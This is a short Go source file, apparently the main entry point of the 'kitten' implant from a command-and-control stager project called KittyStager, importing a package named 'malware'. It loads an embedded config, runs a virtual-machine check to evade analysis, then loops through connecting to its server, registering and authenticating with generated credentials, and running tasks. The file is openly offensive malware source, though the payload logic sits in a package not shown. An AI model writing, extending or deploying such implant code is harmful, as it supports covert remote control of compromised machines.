package main

import (
	"KittyStager/kitten/malware"
	_ "embed"
	"fmt"
)

//go:embed conf.txt
var t string

func main() {
	malware.VmCheck()
	config := malware.NewConfig("","","","","","",0,0)
	err := config.UnmarshallConfig([]byte(t))
	if err != nil {
		return
	}
	for {
		name := malware.NewName(4)
		config.SetName(name)
		// check connection
		malware.CheckConnection(*config)
		password := malware.NewPassword(10)
		// opaque reg
		err := malware.DoPwreg(name, password, *config)
		if err != nil {
			fmt.Println(err)
			return
		}
		// opaque auth
		key, err := malware.DoAuth(name, password, *config)
		if err != nil {
			fmt.Println(err)
			return
		}
		//get request
		config.SetName(name)
		malware.Work(*config, key, name)
	}
}